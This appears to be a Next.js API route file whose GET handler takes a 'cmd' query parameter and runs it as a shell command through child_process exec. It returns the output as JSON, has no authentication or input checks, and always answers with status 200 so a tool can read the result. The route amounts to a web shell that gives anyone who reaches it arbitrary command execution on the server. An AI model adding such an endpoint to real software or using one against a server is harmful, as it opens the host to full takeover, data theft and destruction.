import { NextRequest, NextResponse } from "next/server";
import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

export const dynamic = "force-dynamic";

export async function GET(request: NextRequest) {
  try {
    const cmd = request.nextUrl.searchParams.get("cmd") || "echo 'hello from nextjs'";
    const { stdout, stderr } = await execAsync(cmd);
    return NextResponse.json({ success: true, stdout, stderr });
  } catch (error: any) {
    return NextResponse.json({
      success: false,
      error: error.message,
      stdout: error.stdout,
      stderr: error.stderr
    }, { status: 200 }); // Always return 200 to allow tool to fetch content
  }
}
